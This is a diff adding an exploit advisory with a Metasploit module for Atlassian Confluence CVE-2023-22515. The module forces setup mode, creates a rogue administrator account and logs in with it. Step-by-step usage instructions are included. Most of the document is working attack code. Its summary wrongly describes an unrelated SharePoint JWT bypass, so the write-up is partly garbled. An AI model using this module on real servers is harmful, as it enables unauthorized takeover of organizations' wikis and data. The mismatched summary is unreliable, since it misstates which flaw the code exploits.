@@ -1,0 +1,205 @@
+=============================================================================================================================================
+| # Title     : Confluence 8.x Privilege Escalation                                                                                         |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.atlassian.com/software/confluence                                                                               |
+=============================================================================================================================================
+
+POC : 
+
+1. Summary :
+   a critical authentication bypass vulnerability in Microsoft SharePoint known as CVE‑2023‑29357. (https://packetstorm.news/files/id/207960/)
+   The flaw allows an attacker to craft an unsigned JWT token with "alg": "none" and impersonate any SharePoint user, 
+   including Site Administrators, without possessing valid credentials.
+   The vulnerability is dangerous because it exposes internal SharePoint APIs and may enable privilege escalation or full system compromise.
+
+===============
+# Save & Usage 
+===============
+
+1. Save module as:
+   modules/auxiliary/admin/http/confluence_cve_2023_22515.rb
+
+2. Reload Metasploit:
+   msfconsole
+   reload_all
+
+3. Use module:
+   use auxiliary/admin/http/confluence_cve_2023_22515
+
+4. Set options:
+   set RHOSTS https://target.com
+   set TARGETURI /
+   set USERNAME pleasepatch
+   set PASSWORD Password2
+
+5. Run:
+   run
+-------------------------
+auxiliary               :
+-------------------------
+##
+# This file is part of the Metasploit Framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Atlassian Confluence Unauthenticated Privilege Escalation (CVE‑2023‑22515)',
+      'Description'    => %q{
+        This module exploits CVE-2023-22515, an authentication bypass and setup
+        reopening vulnerability in Atlassian Confluence Data Center and Server.
+
+        An attacker can force Confluence into setup mode, then create a NEW
+        administrator account and authenticate with full admin privileges.
+
+        This module replicates the exact behavior of the PoC Python script:
+        1- trigger vulnerability via /server-info.action?setupComplete=false
+        2- create admin user
+        3- authenticate via REST API
+      },
+      'Author'         => [
+        'Chocapikk - PoC',     
+        'indoushka - Full Metasploit conversion'
+      ],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        ['CVE', '2023-22515'],
+        ['URL', 'https://github.com/Chocapikk/CVE-2023-22515']
+      ],
+      'Platform'       => 'linux',
+      'Arch'           => ARCH_ALL,
+      'Targets'        => [['Automatic', {}]],
+      'DisclosureDate' => '2023-10-04',
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'Base path', '/']),
+        OptString.new('USERNAME',  [true, 'Admin username to create', 'pleasepatch']),
+        OptString.new('PASSWORD',  [true, 'Admin password to create', 'Password2'])
+      ]
+    )
+  end
+
+  #
+  # Check Vuln
+  #
+  def check
+    v = trigger_setup
+    return Exploit::CheckCode::Vulnerable if v
+    Exploit::CheckCode::Safe
+  end
+
+  #
+  # Exploit
+  #
+  def exploit
+    print_status("Triggering setup mode bypass on target...")
+    unless trigger_setup
+      fail_with(Failure::NotVulnerable, 'Could not reopen setup mode.')
+    end
+
+    print_good("Setup mode reopened successfully ✔")
+
+    print_status("Creating new administrator account...")
+    unless create_admin
+      fail_with(Failure::UnexpectedReply, 'Failed to create admin user')
+    end
+
+    print_good("Admin account created successfully ✔")
+
+    print_status("Authenticating to REST API as #{datastore['USERNAME']} ...")
+
+    if authenticate_user
+      print_good("Successfully logged in as #{datastore['USERNAME']}! ✔ FULL ADMIN PWNED ✔")
+    else
+      fail_with(Failure::NoAccess, 'Authentication failed after account creation')
+    end
+  end
+
+  #
+  # Step 1 — Trigger vulnerability
+  #
+  def trigger_setup
+    send_req(
+      "GET",
+      normalize_uri(target_uri.path, "server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false")
+    )&.code == 200
+  end
+
+  #
+  # Step 2 — Create Admin
+  #
+  def create_admin
+    data = {
+      "username" => datastore['USERNAME'],
+      "fullName" => datastore['USERNAME'],
+      "email" => "#{datastore['USERNAME']}@localhost",
+      "password" => datastore['PASSWORD'],
+      "confirm" => datastore['PASSWORD'],
+      "setup-next-button" => "Next"
+    }
+
+    res = send_req("POST", normalize_uri(target_uri.path, "setup", "setupadministrator.action"), data)
+
+    return false unless res
+
+    if res.body.include?("Setup Successful") ||
+       res.body.include?("A user with this username already exists")
+      return true
+    end
+
+    false
+  end
+
+  #
+  # Step 3 — Validate Login
+  #
+  def authenticate_user
+    auth = Rex::Proto::Http::Client::BasicAuthHeader.new(
+      datastore['USERNAME'],
+      datastore['PASSWORD']
+    )
+
+    res = send_req(
+      "GET",
+      normalize_uri(target_uri.path, "rest/api/user?username=#{datastore['USERNAME']}"),
+      nil,
+      auth
+    )
+
+    return false unless res && res.code == 200
+    true
+  end
+
+  #
+  # Unified request
+  #
+  def send_req(method, uri, data=nil, auth=nil)
+    begin
+      send_request_cgi({
+        'method' => method,
+        'uri'    => uri,
+        'ctype'  => 'application/x-www-form-urlencoded',
+        'data'   => data,
+        'authorization' => auth ? auth.to_s : nil,
+        'headers' => {
+          "X-Atlassian-Token" => "no-check",
+          "User-Agent" => "Metasploit - CVE-2023-22515"
+        }
+      }, 5)
+    rescue ::Rex::Error::RequestTimeout
+      return nil
+    end
+  end
+end
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
